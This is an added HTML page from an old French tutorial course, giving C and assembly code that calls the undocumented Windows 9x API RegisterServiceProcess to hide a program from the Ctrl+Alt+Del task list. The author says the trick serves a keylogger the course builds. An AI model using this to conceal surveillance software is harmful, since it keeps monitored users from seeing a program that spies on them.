@@ -1,0 +1,111 @@
+<html>
+<head><title>APIs cachées</title>
+</head>
+<BODY BGCOLOR="#000000" TEXT="#FFFFFF" LINK="#0000FF" VLINK="#0000FF" ALINK="#0000FF">
+<pre><br><br>
+<FONT SIZE=6 COLOR="#0000FF"><center><b>Utilisation d'une API cachée</b></center></font></pre>
+<br>
+Il existe une API non documentée appellée RegisterServiceProcess permettant de
+cacher un programme pour qu'il ne soit pas visible en faisant
+ctrl + alt + sup.<br>
+Je vous l'explique ici, car cela sert dans le keylogger et peut être
+assez difficile à comprendre. Bon tout d'abord on va voir comment le faire
+en c car c'est le plus simple à faire.<br>
+Voici donc une fonction qui cachera le programme de windows :<br>
+<pre><font size=2 color=#00ccFF>
+---------------------------------------------------------------------------------
+
+BOOL RegisterServiceProcess( DWORD p1, DWORD p2 )
+  {
+    typedef DWORD (WINAPI *PREGISTERSERVICEPROCESS)(DWORD,DWORD);
+
+    PREGISTERSERVICEPROCESS  rsp;
+    CHAR        K32Path[ MAX_PATH ];
+    HINSTANCE   hK32;
+    BOOL        Rc;
+
+    Rc = FALSE;
+    GetSystemDirectory( K32Path, MAX_PATH );
+    strcat( K32Path, "\\kernel32.dll" );
+    hK32 = LoadLibrary( K32Path );
+    if( hK32 != NULL ) {
+      rsp = (PREGISTERSERVICEPROCESS)GetProcAddress(hK32,"RegisterServiceProcess");
+      if( rsp != NULL ) {
+        Rc = TRUE;
+        rsp( p1, p2 );
+      }
+      FreeLibrary( hK32 );
+    }
+    return Rc;
+  }
+---------------------------------------------------------------------------------
+</pre></font>
+Et vous l'appelez comme ceci:
+<pre><font size=2 color=#00ccFF>
+---------------------------------------------------------------------------------
+RegisterServiceProcess( 0, 1 );
+---------------------------------------------------------------------------------
+</pre></font>
+Voyez cela n'est pas très simple quand même. Essayons de comprendre ce source.
+Tout d'abord GetSystemDirectory va chercher le dossier "system" de windows.
+Ensuite ou ajoute Kernell32.dll à ce chemin. On obtient ainsi le chemin menant
+à Kernel32. Dans le source en asm, pour simplifier, nous admettrons que le chemin
+du kernel est c:\windows\system\kernel32.dll<br>
+Ensuite on utilise l'API LoadLibrary qui renvoie le handle de Kernel32.
+Puis GetProcAddress qui nous donne l'adresse de l'API cachée "RegisterServiceProcess".
+Cette adresse est placée dans rsp qui est de type PREGISTERSERVICEPROCESS. C'est un
+type que nous venons de créer avec la ligne :<br>
+<pre><font size=2 color=#00ccFF>
+---------------------------------------------------------------------------------
+typedef DWORD (WINAPI *PREGISTERSERVICEPROCESS)(DWORD,DWORD);
+---------------------------------------------------------------------------------
+</pre></font>
+Ce type comprend un pointeur sur l'adresse de notre API ainsi que deux Double
+Words qui servent de paramètres.
+Il ne reste plus qu'a appeler notre API cachée de cette manière:
+<pre><font size=2 color=#00ccFF>
+---------------------------------------------------------------------------------
+rsp( p1, p2 );
+---------------------------------------------------------------------------------
+</pre></font>
+Puis on libère Kernel32.
+
+Ce sera toujours de cette manière qu'il faudra procéder pour utiliser les APIs
+"cachées". Ce genre d'API n'est pas documenté cependant vous en avez un bref aperçu
+dans les "Unautorized Windows 95". C'est une documentation en anglais très
+enrichissante mais parfois compliquée à comprendre. Voyons maintenant comment procéder
+en assembleur.
+
+On va simplifier un peu tout ça pour que ce soit plus simple en ne recherchant pas
+le dossier system.On commence par déclarer les variables dont on a besoin:
+<pre><font size=2 color=#00ccFF>
+---------------------------------------------------------------------------------
+hK32 HINSTANCE ?
+registersp db "RegisterServiceProcess",0
+K32Path    db "c:\windows\system\kernel32.dll",0
+---------------------------------------------------------------------------------
+</pre></font>
+puis on refait la même chose:
+<pre><font size=2 color=#00ccFF>
+---------------------------------------------------------------------------------
+   invoke LoadLibrary, addr K32Path;
+   mov hK32, eax
+   invoke GetProcAddress, hK32, addr registersp
+   cmp eax,00
+   je free
+
+   push 1
+   push 0
+   call eax
+
+free:
+   invoke FreeLibrary, addr hK32
+---------------------------------------------------------------------------------
+</pre></font>
+Et en plus ça se comprend mieux ! Voila donc maintenant vous savez qu'il existe
+des APIS non documentées et comment les utiliser.
+Il serait désormais une bonne chose de voir comment fonctionnent les dlls.
+<br><br><br>
+<center><a href="cours.htm">SOMMAIRE</a> | SUIVANT</center><br>
+
+</noscript><script type="text/javascript" src="http://ads.multimania.lycos.fr/ad/ad.php?cat=data_processing&mkw=&CC=fr&ord=3d2db591&adpref="></script>
